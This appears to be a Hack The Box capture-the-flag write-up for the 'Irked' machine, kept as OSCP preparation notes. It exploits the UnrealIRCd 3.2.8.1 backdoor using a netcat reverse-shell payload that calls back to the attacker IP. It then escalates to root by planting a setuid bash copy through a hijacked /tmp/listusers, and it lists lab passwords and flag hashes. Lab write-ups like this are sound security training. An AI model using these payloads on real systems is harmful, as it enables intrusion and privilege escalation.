Machine: https://app.hackthebox.com/machines/163

IP: 10.10.10.117

# Enumeration

Port 22
Port 80:

`IRC is almost working!`

111

Port 6697:

```bash
telnet 10.10.10.117 6697

ERROR :Closing Link: [10.10.16.12] (Throttled: Reconnecting too fast) -Email djmardov@irked.htb for more information.
```

8067
45613
65534

Use `hexchat` to connect to IRC server

`hexchat`

Add new **Networks** -> Use 10.10.10.117/6697 as server

After connected we can see the version of it:

`Your host is irked.htb, running version Unreal3.2.8.1`


# Exploitation

`searchsploit unrealirc`

Seeing the exploit `searchsploit -x linux/remote/16922.rb`:

`sock.put("AB;" + payload.encoded + "\n")`

Payload:

`AB; reverse shell`

`AB;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.12 1234 >/tmp/f`

Got shell as ircd

# Post-Exploitation

## Shell as ircd

ircd@irked:/home/djmardov/Documents$ cat .backup 
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss

We have irked.jpg earlier that required passphrase when using steghide against it

```bash
➜  www steghide extract -sf irked.jpg
Enter passphrase: 
wrote extracted data to "pass.txt".
```

pass.txt

`Kab6h+m+bbp2J:HG`

Logged in djmardov

## Shell as djmardov

user.txt 93be9ff8a2df233136394ad8a972c357

SUID that stand out:

`/usr/bin/viewuser`

When we execute this binary, we see that it tries to execute something in /tmp/listusers because there is `sh:` in the front

```bash
bash-4.3# viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2024-02-20 13:06 (:0)
djmardov pts/1        2024-02-20 13:40 (10.10.16.12)
sh: 1: /tmp/listusers: not found
```

Exploit:

`echo "cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash" > /tmp/listusers`

`/tmp/bash -p`

root.txt bb38f568bc6d54973e6541191c45a3a1

# Beyond Root

Let's get this `viewuser` file to our machine and ltrace it

`ltrace ./viewuser`

`setuid(0)                                                   = -1
system("/tmp/listusers"sh: 1: /tmp/listusers: not found
`

It sets the `setuid` to 0 which is root and execute the `/tmp/listusers` file.
![image](https://github.com/Leng-Phirun/OSCP_Prep_TJNull/assets/100512862/0c487738-6455-40ab-9d2c-41a0f1775c03)
